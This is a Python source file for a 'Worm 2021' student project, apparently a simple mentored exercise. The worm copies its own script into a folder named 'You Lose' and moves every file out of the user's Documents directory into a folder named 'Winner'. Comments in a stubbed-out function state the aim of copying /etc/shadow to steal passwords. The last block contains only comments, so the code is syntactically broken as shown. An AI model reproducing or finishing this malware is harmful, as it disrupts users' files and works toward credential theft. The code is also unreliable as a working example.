#The Beginning

# Worm 2021 Project By Mia Jenkins and Mentored by Deep Ramanayake

#import modules
import sys #allows for command line and creating files 
import os #allows us access for command line as well but more clear
import glob #helps with replication process and path finding 
#import nmap #should allow me to pull from the nmap; may not use
import socket #should allow me to pull the ip address of the host machine of the virus
import platform #gives me system info
from sys import argv #uses arguments 
import subprocess #allows you to use terminal commands 
import shutil #allows use to do file movement




def wiggle():
    #the purpose of this function is to allow the worm to move and find files

    print('I am staring in the wiggle')

    #first check the OS
    system = platform.system()

    #the computer is linux 
    if(system == "Linux"):
        #get the current location
        #currentpath = os.path.abspath("worm.py") #im gonna ignore this for now <3

        #need the username to properly get pathway names
        username = os.getlogin()

        #if the worm is in downloads
        if(os.path.isdir("/home/"+username+"/Downloads/") == True):
            #we go to that directory

            #make a copy of the folder that holds the worm in it 

            copy()

            #should I send it to another location

        #if the worm is in Documents
        if(os.path.isdir("/home/"+username+"/Pictures/") == True):

            #we go to that directory

            #make a copy of the folder that holds the worm in it 

            copy()
           
        #if its not in any of those two locations this person is weird grab me the passwords
        else:
            #send the worm to the /etc and copy the shadow file but that may need addditional permissions
            #for right now just take whatever
            copy()

def copy():

    #code begins the copy function of the worm which allows it to replicate on the users computer

    #began the worm copy method
    script = argv

    #setting this to a name 
    name = str(script[0])

    #going to create the directory twice
    for i in range(0,1):
        directoryName = 'You Lose'
        subprocess.call(['mkdir', directoryName])
        subprocess.call(['cp',name, directoryName])

def take():
    #the take method will create a file and send all the other files in that folder

    #get the username
    username = os.getlogin()

    #check for the worm.py file
    #if os.path.exists('worm.py'):
        #get the directory path way
    #    wormLocation = os.path.dirname('worm.py')
    #else:
    #    copy()

    #create the folder there??
    directory = 'Winner'
    subprocess.call(['mkdir', directory]) #this is my destination file

    #copy all of the files in that directory

    #i need to list all of the folder in a
    files = os.listdir("/home/"+username+"/Documents")
    #then loop through all of those files
    for filename in files:
        #want to make the files a full pathway to properly copy
        full_name = os.path.join("/home/"+username+"/Documents", filename)
        if os.path.isfile(full_name):

            #send all of those copies to a new file 
            shutil.move(full_name, directory)

    #It has taken from Documents

    if(os.path.isdir("/home/"+username+"/Downloads/") == True):

        #FOLLOW THE SAME PROCESS BUT TAKE FROM THAT FOLDER

        #list the files in thar dirtory
        
        #loop through them
            #make a full pathway 
            #if it is a full pathway
                #move those files to "winner"

def main():
    print("NOW STARTING")
    #wiggle()
    copy()
    take()
    print("GAME OVER")

if __name__ == "__main__":
    main()


# The End 